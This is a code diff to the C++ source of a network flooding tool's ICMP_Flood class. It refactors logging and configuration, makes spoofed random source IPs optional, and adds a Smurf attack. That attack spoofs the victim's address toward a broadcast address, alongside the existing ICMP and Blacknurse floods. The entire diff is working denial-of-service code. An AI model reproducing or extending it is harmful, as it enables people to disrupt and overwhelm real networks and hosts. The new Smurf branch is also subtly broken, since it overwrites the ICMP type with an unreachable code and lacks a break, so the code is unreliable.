@@ -1,5 +1,6 @@
 #include <unistd.h>
 #include <cstring>
+#include <utility>
 #include <netdb.h>
 #include <arpa/inet.h>
 #include <netinet/ip_icmp.h>
@@ -10,8 +11,9 @@
 void ICMP_Flood::attack(const int *id) {
     int r;
     std::vector<int> sockets;
+    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
     for (int x = 0; x < conf->CONNECTIONS; x++) {
-        sockets.push_back(0);
+        sockets.emplace_back(0);
     }
     char buf[400];
     std::string message{};
@@ -29,14 +31,18 @@ void ICMP_Flood::attack(const int *id) {
 
             if((hp = gethostbyname(conf->website.c_str())) == nullptr){
                 if((ip->daddr = inet_addr(conf->website.c_str())) == -1){
-                    logger->Log("Can't resolve the host", Logger::Error);
+                    conf->logger->Log("Can't resolve the host", Logger::Error);
                     exit(EXIT_FAILURE);
                 }
             }else{
                 bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
             }
-            if((ip->saddr = inet_addr(Randomizer::randomIP().c_str())) == -1){
-                continue;
+            if(conf->RandomizeSource){
+                if((ip->saddr = inet_addr(Randomizer::randomIP().c_str())) == -1){
+                    continue;
+                }
+            }else{
+                ip->saddr = 0;
             }
 
             init_headers(ip, icmp, buf);
@@ -53,31 +59,36 @@ void ICMP_Flood::attack(const int *id) {
             }else{
                 message = std::string("Socket[") + std::to_string(x) + "->"
                           + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
                 message = std::to_string(*id) + ": Voly Sent";
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
             }
         }
         message = std::to_string(*id) + ": Voly Sent";
-        logger->Log(&message, Logger::Info);
+        conf->logger->Log(&message, Logger::Info);
         pause();
     }
 }
 
-ICMP_Flood::ICMP_Flood(const config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {
+ICMP_Flood::ICMP_Flood(std::shared_ptr<Config> conf) : Spoofed_Flood(std::move(conf)) {
 
 }
 
 void ICMP_Flood::override_headers(icmphdr *icmp, iphdr *ip){
     switch (conf->vector){
-        case config::ICMPFlood:
+        case Config::ICMPFlood:
             icmp->type = static_cast<u_int8_t>(Randomizer::randomInt(1, 30));
             icmp->code = static_cast<u_int8_t>(Randomizer::randomInt(1, 15));
             break;
-        case config::Blacknurse:
+        case Config::Blacknurse:
             icmp->type = ICMP_DEST_UNREACH;
             icmp->code = ICMP_PORT_UNREACH;
             break;
+        case Config::Smurf:
+            icmp->type = ICMP_ECHO;
+            icmp->type = ICMP_NET_UNREACH;
+            ip->daddr = inet_addr(conf->broadcast.c_str());
+            ip->saddr = inet_addr(conf->website.c_str());
         default:break;
     }
 }
